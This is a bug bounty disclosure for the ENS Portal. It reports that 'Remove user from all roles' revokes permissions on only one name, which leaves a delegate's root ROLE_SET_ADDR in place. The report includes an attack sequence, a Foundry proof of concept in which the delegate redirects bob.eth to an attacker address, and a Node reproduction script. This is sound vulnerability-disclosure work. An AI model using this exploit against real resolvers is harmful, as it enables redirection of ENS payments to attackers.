# 92464 w a critical resolver role aggregation causes remove user from all roles to revoke only one resource leaving the delegate able to redirect ens addresses

**Submitted on Sep 10th 2026 at 01:32:27 UTC by @kimnoic for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92464
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Brief/Intro

The Resolver roles UI merges one account's permissions across the resolver root and multiple ENS-name resources into a single row, but its removal flow selects only one non-root name and sends the entire displayed role union to that one name-scoped revocation. Consequently, a user can approve a successful transaction after being told that the delegate will be removed “from all roles,” while root or other-name permissions remain active. A surviving `ROLE_SET_ADDR` lets the supposedly removed delegate redirect ENS address records to an attacker-controlled address, potentially causing payments made through the affected ENS names to be stolen.

## Vulnerability Details

### Affected components

* `apps/portal/src/lib/roles/resolverRoles.ts:179-220`
* `apps/portal/src/lib/roles/resolverRoles.test.ts:185-197`
* `apps/portal/src/features/resolver/components/ResolverRolesTable.tsx:102-105`
* `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:165-173`
* `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:295-323`
* `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:391-396`
* `apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:441-463`
* `apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts:45-60`
* `apps/portal/src/features/resolver/helpers/prepareResolverRolesIntent.ts:38-46`
* `apps/portal/src/features/resolver/components/ResolverAddUserSheet.tsx:37-39, 186-205, 248-289`

### Root cause: resource identity is destroyed during grouping

The resolver overview query returns all role records for the selected `PermissionedResolver`. Each role record contains an `account`, a `resource`, and a `roleBitmap`. These fields describe separate EAC assignments: the same account may hold different permissions at the resolver root, on `alice.eth`, and on `bob.eth`.

However, `groupRolesByAccount()` uses only the lowercased account as its grouping key:

```ts
for (const role of roles) {
  const account = role.account.toLowerCase()
  const resource = role.resource.toLowerCase()
  const decoded = decodeResolverRoleBitmap(role.roleBitmap)
  const resolvedName = resourceToName?.get(resource) ?? null

  const existing = grouped.get(account)

  if (existing) {
    existing.roles.push(role)
    existing.decodedRoles.push(...decoded)
    if (resolvedName) existing.resolvedNames.add(resolvedName)
  }
  // ...
}
```

As a result, `decodedRoles` becomes the union of permissions held on independent resources. Although the raw role entries remain in `roles`, the editing code does not use their individual resources. The frozen unit test explicitly requires this unsafe behavior:

```ts
it('should merge the same account across resources', () => {
  const roles = [
    makeRole('0xABC', resolverRoles.ROLE_SET_ADDR),
    makeRole('0xABC', resolverRoles.ROLE_SET_TEXT, resourceB),
  ]

  const result = groupRolesByAccount(roles)

  expect(result).toHaveLength(1)
  expect(result[0].decodedRoles).toEqual([
    'ROLE_SET_ADDR',
    'ROLE_SET_TEXT',
  ])
})
```

`ResolverRolesTable` passes these account-only groups directly into the editable sidebar:

```ts
const data = useMemo(
  () => groupRolesByAccount(roles, buildResourceToNameMap(nodes)),
  [roles, nodes],
)
```

### One arbitrary name is substituted for every resource in the group

The sidebar receives the flattened role union and the list of all resolved names. It does not retain or select an authoritative resource. Instead, it chooses the first non-root name, falling back to the root only when no non-root name exists:

```ts
const decodedRoles = (row?.original.decodedRoles ?? []) as ResolverRoleKey[]
const resolvedNames = row?.original.resolvedNames ?? []

const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''
```

Therefore:

* `(root) + alice.eth` always becomes `alice.eth`;
* `alice.eth + bob.eth` becomes only whichever name appears first;
* `(root) + alice.eth + bob.eth` also becomes one name only.

The UI simultaneously describes a root-containing group as global:

```tsx
{resolvedNames.includes('(root)')
  ? 'Global roles (all names)'
  : `Roles scoped to ${resolvedNames
      .filter((n) => n !== '(root)')
      .join(', ')}`}
```

When the user clicks `Remove user`, the code combines the single selected name with the cross-resource role union:

```ts
setPendingAction({
  type: 'remove',
  name: roleName,
  account: selectedAccount,
  roles: decodedRoles,
})
```

The confirmation dialog makes an unambiguous security promise:

```
Are you sure you want to remove this user from all roles?
```

### The generated transaction can revoke only one resource

`prepareRevokeResolverRolesTransaction()` selects the root operation only when `name` is the empty string. Every non-empty name is encoded as exactly one name-scoped operation:

```ts
const writeParams = revokeResolverRolesWriteParameters(
  walletClient,
  name === ''
    ? {
        resolverAddress,
        targetAccount: account,
        scope: 'root',
        roles,
      }
    : {
        resolverAddress,
        targetAccount: account,
        scope: 'name',
        name,
        roles,
      },
)
```

For name scope, ENSJS encodes:

```solidity
authorizeNameRoles(encodedName, roleBitmap, targetAccount, false)
```

For root scope, it encodes the independent operation:

```solidity
revokeRootRoles(roleBitmap, targetAccount)
```

Because the sidebar chooses a non-root `roleName` whenever one exists, a root role in the same UI row is never targeted. Likewise, if two names are merged, only one name's resource is targeted.

The transaction is valid and can succeed. It simply performs less authorization revocation than the UI represents. Query invalidation after success does not repair the residual permission and does not make the operation atomic; it may merely reveal the surviving role after the attacker has retained the ability to act.

### The vulnerable role state is reachable through the application itself

This does not require a malformed indexer response or an unusual direct contract call. `ResolverAddUserSheet` supports both:

```
Root (all nodes)
alice.eth
bob.eth
...
```

An administrator can therefore grant the same delegate a root permission and a separate name-scoped permission using normal Portal operations. The role page then merges those records by account.

### Why the surviving permission remains exploitable

ENSv2 EnhancedAccessControl treats resource `0` as `ROOT_RESOURCE`. Roles assigned at root level automatically apply to every resource, and permission checks combine the roles held on the specific resource with root-level roles.

The raw `PermissionedResolver` protects `setAddr()` with `ROLE_SET_ADDR`:

```solidity
function setAddr(bytes32 node, uint256 coinType, bytes memory addressBytes)
    public
    onlyPartRoles(
        node,
        PermissionedResolverLib.partHash(coinType),
        PermissionedResolverLib.ROLE_SET_ADDR
    )
{
    _record(node).addresses[coinType] = addressBytes;
    emit AddressChanged(node, coinType, addressBytes);
}
```

Accordingly, if root `ROLE_SET_ADDR` survives the misleading removal, the delegate can still modify address records for every node served by that resolver. In the multi-name variant, a name-scoped `ROLE_SET_ADDR` surviving on `bob.eth` lets the delegate redirect `bob.eth` specifically.

### Attack sequence

1. The victim administers a `PermissionedResolver` used by `alice.eth` and `bob.eth`.
2. Through the normal Add User form, the victim grants a delegate root `ROLE_SET_ADDR` and `alice.eth`-scoped `ROLE_SET_TEXT`.
3. The delegate later becomes malicious, is compromised, or is no longer trusted.
4. The victim opens `/resolver/<resolver>/roles`. The Portal shows one row for the delegate containing `(root)` and `alice.eth`, the union of the two permissions, and the label `Global roles (all names)`.
5. The victim clicks `Remove user` and approves the transaction after being told that the user will be removed from all roles.
6. The Portal chooses `alice.eth` and submits `authorizeNameRoles(alice.eth, ROLE_SET_ADDR | ROLE_SET_TEXT, delegate, false)`.
7. The transaction succeeds on the `alice.eth` resource. It never calls `revokeRootRoles`, so root `ROLE_SET_ADDR` survives.
8. The supposedly removed delegate calls `setAddr(namehash("bob.eth"), attackerAddress)`.
9. `bob.eth` resolves to the attacker's address. Subsequent payments relying on that ENS resolution can be transferred to the attacker.

## Impact Details

### Selected in-scope impact

> **Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as resolving or rendering an ENS name to an attacker-controlled address or showing the wrong recipient or amount on a transaction the user then approves.**

This is the most direct impact classification because the application presents an all-resource authorization removal but pre-fills and submits a transaction containing only one `name/scope`. The victim signs a transaction whose effective resolver resource differs from the action represented by the application.

### Security consequences

1. **Authorization survives a successful security operation.** The delegate remains authorized even though the Portal reports completion of “Remove user from all roles.”
2. **ENS address redirection.** A surviving `ROLE_SET_ADDR` permits the delegate to replace the ETH or other supported address record with an attacker-controlled destination.
3. **Potential direct loss of funds.** Users, wallets, exchanges, DAOs, or integrations that subsequently resolve and pay the affected ENS name can send funds to the attacker. The maximum loss is not bounded by the cost of exploiting the bug; it depends on the value of later transactions relying on the poisoned name.
4. **Cross-name blast radius for root permissions.** A surviving root role applies to every name served by the `PermissionedResolver`, so one failed revocation can expose multiple names and all future payments relying on them.
5. **Other record compromise.** Depending on the surviving bitmap, the delegate may also retain the ability to modify text, contenthash, ABI, interface, name, alias, clear, or upgrade-related state.

The primary selected impact should not be static-content injection, HCA/session takeover, or a Manager registration/migration/transfer hijack. The bug requires the victim to approve the misleading revocation transaction, and it occurs in Resolver role management. “Direct theft of user funds” is a downstream consequence, but the incorrect-name/transaction-detail category describes the immediate application failure most precisely.

## References

* [ENSJS `revokeResolverRoles` transaction builders](https://github.com/ensdomains/ensjs/blob/main/packages/ensjs/src/actions/wallet/v2/resolver/revokeResolverRoles.ts)
* [ENSv2 EnhancedAccessControl documentation](https://github.com/ensdomains/contracts-v2/tree/main/contracts#access-control)
* [Raw `PermissionedResolver.sol`](https://github.com/ensdomains/contracts-v2/blob/main/contracts/src/resolver/PermissionedResolver.sol)
* [Official raw-contract Foundry fixture](https://github.com/ensdomains/contracts-v2/blob/main/contracts/test/unit/resolver/PermissionedResolver.t.sol)

## Proof of Concept

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";

import {VerifiableFactory} from "@ensdomains/verifiable-factory/VerifiableFactory.sol";
import {NameCoder} from "@ens/contracts/utils/NameCoder.sol";

import {EACBaseRolesLib} from "~src/access-control/libraries/EACBaseRolesLib.sol";
import {PermissionedResolverLib} from "~src/resolver/libraries/PermissionedResolverLib.sol";
import {PermissionedResolver} from "~src/resolver/PermissionedResolver.sol";

contract ResolverRoleScopeConfusionPoC is Test {
    uint256 internal constant DEFAULT_ROLES = EACBaseRolesLib.ALL_ROLES;

    VerifiableFactory internal factory;
    PermissionedResolver internal implementation;
    PermissionedResolver internal resolver;

    address internal owner = makeAddr("owner");
    address internal delegate = makeAddr("delegate");
    address internal attacker = makeAddr("attacker");

    bytes internal aliceName;
    bytes internal bobName;
    bytes32 internal aliceNode;
    bytes32 internal bobNode;

    function setUp() external {
        factory = new VerifiableFactory();
        implementation = new PermissionedResolver(address(this));

        aliceName = NameCoder.encode("alice.eth");
        bobName = NameCoder.encode("bob.eth");
        aliceNode = NameCoder.namehash(aliceName, 0);
        bobNode = NameCoder.namehash(bobName, 0);

        bytes memory initData = abi.encodeCall(
            PermissionedResolver.initialize,
            (owner, DEFAULT_ROLES, new bytes[](0))
        );

        resolver = PermissionedResolver(
            factory.deployProxy(
                address(implementation),
                uint256(keccak256(initData)),
                initData
            )
        );
    }

    function test_RemoveAllRolesOnlyRevokesOneNameAndLeavesGlobalAddressControl()
        external
    {
        // Normal application-created state: the same account has one root role
        // and one alice.eth-scoped role.
        vm.prank(owner);
        resolver.grantRootRoles(
            PermissionedResolverLib.ROLE_SET_ADDR,
            delegate
        );

        vm.prank(owner);
        resolver.authorizeNameRoles(
            aliceName,
            PermissionedResolverLib.ROLE_SET_TEXT,
            delegate,
            true
        );

        uint256 aliceResource = PermissionedResolverLib.resource(
            aliceNode,
            bytes32(0)
        );

        assertTrue(
            resolver.hasRootRoles(
                PermissionedResolverLib.ROLE_SET_ADDR,
                delegate
            )
        );
        assertTrue(
            resolver.hasRoles(
                aliceResource,
                PermissionedResolverLib.ROLE_SET_TEXT,
                delegate
            )
        );

        // Exact vulnerable frontend transaction: the displayed cross-resource
        // union is revoked only from the first non-root name, alice.eth.
        uint256 displayedRoleUnion =
            PermissionedResolverLib.ROLE_SET_ADDR |
            PermissionedResolverLib.ROLE_SET_TEXT;

        vm.prank(owner);
        bool updated = resolver.authorizeNameRoles(
            aliceName,
            displayedRoleUnion,
            delegate,
            false
        );

        assertTrue(updated, "misleading removal transaction must succeed");
        assertFalse(
            resolver.hasRoles(
                aliceResource,
                PermissionedResolverLib.ROLE_SET_TEXT,
                delegate
            )
        );

        // The root resource was never targeted, so global SET_ADDR survives.
        assertTrue(
            resolver.hasRootRoles(
                PermissionedResolverLib.ROLE_SET_ADDR,
                delegate
            ),
            "BUG: root SET_ADDR survives Remove user from all roles"
        );

        // The supposedly removed delegate redirects another name.
        vm.prank(delegate);
        resolver.setAddr(bobNode, attacker);

        assertEq(
            address(resolver.addr(bobNode)),
            attacker,
            "delegate retains global address-record control"
        );
    }
}
```

And

```js
import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import { join, resolve } from 'node:path'

const repo = resolve(process.argv[2] ?? process.cwd())

const paths = {
  roles: 'apps/portal/src/lib/roles/resolverRoles.ts',
  sidebar:
    'apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx',
  revoke:
    'apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts',
  test: 'apps/portal/src/lib/roles/resolverRoles.test.ts',
}

const source = Object.fromEntries(
  Object.entries(paths).map(([key, relativePath]) => [
    key,
    readFileSync(join(repo, relativePath), 'utf8'),
  ]),
)

const sourceChecks = [
  [
    'groups by account only',
    source.roles.includes('const existing = grouped.get(account)'),
  ],
  [
    'flattens roles from every resource',
    source.roles.includes('existing.decodedRoles.push(...decoded)'),
  ],
  [
    'selects one non-root name for the whole group',
    source.sidebar.includes(
      "resolvedNames.find((n) => n !== '(root)') ?? ''",
    ),
  ],
  [
    'Remove user forwards the flattened role union',
    /type:\s*'remove'[\s\S]*?name:\s*roleName[\s\S]*?roles:\s*decodedRoles/.test(
      source.sidebar,
    ),
  ],
  [
    'dialog promises removal from all roles',
    source.sidebar.includes('remove this user from all roles'),
  ],
  [
    'empty name becomes root scope',
    /name\s*===\s*''[\s\S]*?scope:\s*'root'/.test(source.revoke),
  ],
  [
    'non-empty name becomes exactly one name scope',
    /scope:\s*'name'[\s\S]*?name,[\s\S]*?roles:/.test(source.revoke),
  ],
  [
    'the frozen unit test intentionally merges across resources',
    source.test.includes('should merge the same account across resources'),
  ],
]

for (const [description, ok] of sourceChecks) {
  assert.equal(ok, true, `Frozen-source check failed: ${description}`)
}

const ROOT_RESOURCE = `0x${'00'.repeat(32)}`
const ALICE_RESOURCE = `0x${'11'.repeat(32)}`
const BOB_RESOURCE = `0x${'22'.repeat(32)}`
const delegate = '0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'

const ROLE_SET_ADDR = 'ROLE_SET_ADDR'
const ROLE_SET_TEXT = 'ROLE_SET_TEXT'

// This is the security-relevant behavior of groupRolesByAccount(): its map key
// is account only, while the resource remains buried in the raw roles array.
function vulnerableGroupRolesByAccount(roles, resourceToName) {
  const grouped = new Map()

  for (const role of roles) {
    const account = role.account.toLowerCase()
    const resolvedName = resourceToName.get(role.resource.toLowerCase()) ?? null
    const existing = grouped.get(account)

    if (existing) {
      existing.roles.push(role)
      existing.decodedRoles.push(...role.decodedRoles)
      if (resolvedName) existing.resolvedNames.add(resolvedName)
    } else {
      grouped.set(account, {
        account,
        resolvedNames: new Set(resolvedName ? [resolvedName] : []),
        roles: [role],
        decodedRoles: [...role.decodedRoles],
      })
    }
  }

  return [...grouped.values()].map((group) => ({
    ...group,
    resolvedNames: [...group.resolvedNames],
  }))
}

function vulnerableRemoveAction(group) {
  const roleName = group.resolvedNames.find((name) => name !== '(root)') ?? ''
  return {
    type: 'remove',
    name: roleName,
    account: group.account,
    roles: group.decodedRoles,
  }
}

function revokeAtOneScope(roleState, action, resourceByName) {
  const selectedResource =
    action.name === '' ? ROOT_RESOURCE : resourceByName.get(action.name)

  return roleState
    .map((entry) => {
      if (
        entry.account.toLowerCase() !== action.account.toLowerCase() ||
        entry.resource.toLowerCase() !== selectedResource.toLowerCase()
      ) {
        return entry
      }
      return {
        ...entry,
        decodedRoles: entry.decodedRoles.filter(
          (role) => !action.roles.includes(role),
        ),
      }
    })
    .filter((entry) => entry.decodedRoles.length > 0)
}

// The app itself can create this state: Add user supports both “Root (all
// nodes)” and a specific name. One delegate therefore has roles on three
// independent resources of the same PermissionedResolver.
const before = [
  {
    account: delegate,
    resource: ROOT_RESOURCE,
    decodedRoles: [ROLE_SET_ADDR],
  },
  {
    account: delegate,
    resource: ALICE_RESOURCE,
    decodedRoles: [ROLE_SET_TEXT],
  },
  {
    account: delegate,
    resource: BOB_RESOURCE,
    decodedRoles: [ROLE_SET_ADDR],
  },
]

const resourceToName = new Map([
  [ROOT_RESOURCE, '(root)'],
  [ALICE_RESOURCE, 'alice.eth'],
  [BOB_RESOURCE, 'bob.eth'],
])
const resourceByName = new Map([
  ['alice.eth', ALICE_RESOURCE],
  ['bob.eth', BOB_RESOURCE],
])

const [uiRow] = vulnerableGroupRolesByAccount(before, resourceToName)
const action = vulnerableRemoveAction(uiRow)
const after = revokeAtOneScope(before, action, resourceByName)

assert.deepEqual(uiRow.resolvedNames, ['(root)', 'alice.eth', 'bob.eth'])
assert.deepEqual(uiRow.decodedRoles, [
  ROLE_SET_ADDR,
  ROLE_SET_TEXT,
  ROLE_SET_ADDR,
])
assert.equal(action.name, 'alice.eth')

const retainedRootAddr = after.some(
  (entry) =>
    entry.resource === ROOT_RESOURCE &&
    entry.account.toLowerCase() === delegate &&
    entry.decodedRoles.includes(ROLE_SET_ADDR),
)
const retainedBobAddr = after.some(
  (entry) =>
    entry.resource === BOB_RESOURCE &&
    entry.account.toLowerCase() === delegate &&
    entry.decodedRoles.includes(ROLE_SET_ADDR),
)

assert.equal(retainedRootAddr, true)
assert.equal(retainedBobAddr, true)

// ENS EnhancedAccessControl combines root and resource roles. A retained root
// ROLE_SET_ADDR therefore authorizes setAddr on every resolver node.
const delegateCanSetAddrForAnyName = retainedRootAddr
assert.equal(delegateCanSetAddrForAnyName, true)

console.log('Frozen-source checks: PASS')
console.log('Displayed names:', uiRow.resolvedNames.join(', '))
console.log('Displayed role union:', uiRow.decodedRoles.join(', '))
console.log('Dialog promise: remove this user from all roles')
console.log('Transaction scope actually selected:', action.name)
console.log('Retained root ROLE_SET_ADDR:', retainedRootAddr)
console.log('Retained bob.eth ROLE_SET_ADDR:', retainedBobAddr)
console.log('Delegate can still redirect address records globally:', true)
console.log('ENS-APP-CRIT-01 reproduced: PASS')
```
